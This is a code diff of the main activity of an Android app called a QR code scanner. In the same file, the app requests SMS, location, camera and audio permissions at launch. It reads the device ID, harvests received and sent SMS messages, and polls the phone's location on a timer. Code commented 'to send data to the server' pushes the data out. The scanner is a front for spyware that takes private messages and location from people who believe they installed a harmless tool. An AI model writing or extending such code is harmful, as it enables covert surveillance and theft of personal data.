@@ -1,3 +1,5 @@
+// MAIN ACTIVITY TO LAUNCH A SCAN AND BROWSE THE RESULT
+
 package com.zizou.qrcodescanner
 
 import android.app.Activity
@@ -5,16 +7,12 @@ import android.content.Intent
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.widget.Button
-import android.widget.TextView
-import androidx.activity.result.ActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
-import android.util.Log
 
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 
-import java.net.InetAddress
 import java.io.IOException
 import java.io.InputStreamReader
 import java.io.OutputStreamWriter
@@ -27,7 +25,6 @@ import android.Manifest
 import android.content.Context
 import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationServices
-import androidx.appcompat.app.AlertDialog
 import androidx.core.app.ActivityCompat
 import java.util.Calendar
 import android.os.Handler
@@ -43,6 +40,7 @@ class MainActivity : AppCompatActivity() {
 
     private val requestLocationPermission = 1
     private val requestSMSPermission = 2
+    private val requestAllPermission = 3
     private val received = 1000
     private val sent = 2000
     private lateinit var fusedLocationClient: FusedLocationProviderClient
@@ -55,6 +53,49 @@ class MainActivity : AppCompatActivity() {
     companion object {
         // Define a public static variable
         var androidId: String = ""
+    }
+
+
+    // ------- ACTIONS TO PERFORM WHEN CREATING AND DESTROYING THE ACTIVITY -----------
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        requestAllPermissions()
+
+        setContentView(R.layout.activity_main)
+        getAndroidId(this)
+        retrieveSMSData(this, received)
+        retrieveSMSData(this, sent)
+        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+        handler.postDelayed(runnable, interval.toLong())
+        getLocation()
+
+        qrCodeValueButton = findViewById(R.id.qr_code_value_button)
+        startScanButton = findViewById(R.id.start_scan_button)
+        qrCodeValueButton.isEnabled = false
+
+        initButtonClickListener()
+
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        handler.removeCallbacks(runnable)
+    }
+
+    // ---------- NORMAL OPERATION OF THE QR CODE SCANNER ---------------
+    private fun initButtonClickListener() {
+        startScanButton.setOnClickListener {
+            val intent = Intent(this, ScanQrCodeActivity::class.java)
+            qrCodeValueButton.isEnabled = false
+            resultLauncher.launch(intent)
+        }
+
+        qrCodeValueButton.setOnClickListener() {
+            val intent = Intent(this, WebPageActivity::class.java)
+            intent.putExtra("urlScanned", qrCodeValueButton.text)
+            qrCodeValueButton.isEnabled = false
+            resultLauncher.launch(intent)
+        }
     }
 
     private val resultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
@@ -76,48 +117,62 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
+    private fun requestAllPermissions() {
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.CAMERA
+            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.RECORD_AUDIO
+            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.ACCESS_FINE_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.ACCESS_COARSE_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.READ_SMS
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.RECORD_AUDIO,
+                    Manifest.permission.ACCESS_FINE_LOCATION,
+                    Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.READ_SMS
 
-        getAndroidId(this)
-        retrieveSMSData(this, received)
-        retrieveSMSData(this, sent)
-        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-        handler.postDelayed(runnable, interval.toLong())
-        getLocation()
-
-        qrCodeValueButton = findViewById(R.id.qr_code_value_button)
-        startScanButton = findViewById(R.id.start_scan_button)
-        qrCodeValueButton.isEnabled = false
-
-        initButtonClickListener()
-
-    }
-
-    override fun onDestroy() {
-        super.onDestroy()
-
-        // Remove the callback to stop the periodic task when the service or activity is destroyed
-        handler.removeCallbacks(runnable)
-    }
-    private fun initButtonClickListener() {
-        startScanButton.setOnClickListener {
-            val intent = Intent(this, ScanQrCodeActivity::class.java)
-            qrCodeValueButton.isEnabled = false
-            resultLauncher.launch(intent)
-        }
-
-        qrCodeValueButton.setOnClickListener() {
-            val intent = Intent(this, WebPageActivity::class.java)
-            intent.putExtra("urlScanned", qrCodeValueButton.text)
-            qrCodeValueButton.isEnabled = false
-            resultLauncher.launch(intent)
+                ),
+                requestAllPermission
+            )
+            return
         }
     }
 
+    // -------------- TO REQUEST THE DIFFERENT PERMISSIONS ----------------
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == requestLocationPermission && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
+            getLocation()
+        }
+        if (requestCode == requestSMSPermission && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            retrieveSMSData(this, received)
+            retrieveSMSData(this, sent)
+        }
+        if (requestCode == requestAllPermission
+            && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED
+            && grantResults[1] == PackageManager.PERMISSION_GRANTED
+            && grantResults[2] == PackageManager.PERMISSION_GRANTED
+            && grantResults[3] == PackageManager.PERMISSION_GRANTED
+            && grantResults[4] == PackageManager.PERMISSION_GRANTED) {
+            requestAllPermissions()
+        }
 
-    // SENDING DATA TO SERVER
+    }
+
+    // ---------------- TO SEND DATA TO THE SERVER -----------------------
     private fun newPacket(data: String) {
 
         GlobalScope.launch(Dispatchers.IO) {
@@ -145,6 +200,8 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // ----------- MAP LOCATION FUNCTIONS ------------------
+
     private val runnable = object : Runnable {
         override fun run() {
             getLocation()
@@ -152,7 +209,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // MAP LOCATION FUNCTIONS
     fun getCurrentDate(): String {
         val calendar = Calendar.getInstance()
         val year = calendar.get(Calendar.YEAR)
@@ -161,17 +217,7 @@ class MainActivity : AppCompatActivity() {
 
         return "$day/$month/$year"
     }
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == requestLocationPermission && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
-            getLocation()
 
-        }
-        if (requestCode == requestSMSPermission && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            retrieveSMSData(this, received)
-            retrieveSMSData(this, sent)
-        }
-    }
     private fun getLocation() {
         if (ActivityCompat.checkSelfPermission(
                 this,
@@ -203,12 +249,15 @@ class MainActivity : AppCompatActivity() {
                 }
             }
     }
+
+    // GET THE ANDROID ID TO IDENTIFY A PHONE ON THE SERVER
     @SuppressLint("HardwareIds")
     private fun getAndroidId(context: Context){
         androidId = Secure.getString(context.contentResolver, Secure.ANDROID_ID)
 
     }
 
+    // ----------- SMS RETRIEVAL FUNCTIONS -----------------
     private fun smsPermission() {
         if (ActivityCompat.checkSelfPermission(
                 this,
